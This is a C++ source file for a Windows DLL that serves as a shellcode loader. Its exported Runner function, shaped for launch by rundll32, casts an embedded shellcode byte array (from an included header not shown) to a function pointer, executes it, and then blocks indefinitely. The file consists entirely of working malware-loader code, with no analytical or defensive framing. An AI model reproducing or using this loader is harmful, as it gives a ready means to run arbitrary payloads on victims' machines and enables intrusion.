#include <Nax.h>
#include <Shellcode.h>

EXTERN_C auto DLLEXPORT Runner( HWND hwnd, HINSTANCE hinst, LPSTR cmdLine, int nCmdShow ) -> VOID {
    VOID ( *Nax )( VOID ) = ( decltype( Nax ) )Shellcode::Data;
    Nax();
    WaitForSingleObject( (HANDLE)-1, INFINITE );
}

auto WINAPI DllMain(
    HINSTANCE DllInstance,
    ULONG     Reason,
    PVOID     Reserved
) -> BOOL {
    if ( Reason == DLL_PROCESS_ATTACH )
        DisableThreadLibraryCalls( DllInstance );
    return TRUE;
}

extern "C" BOOL WINAPI DllMainCRTStartup(
    HINSTANCE DllInstance,
    ULONG     Reason,
    PVOID     Reserved
) {
    return DllMain( DllInstance, Reason, Reserved );
}
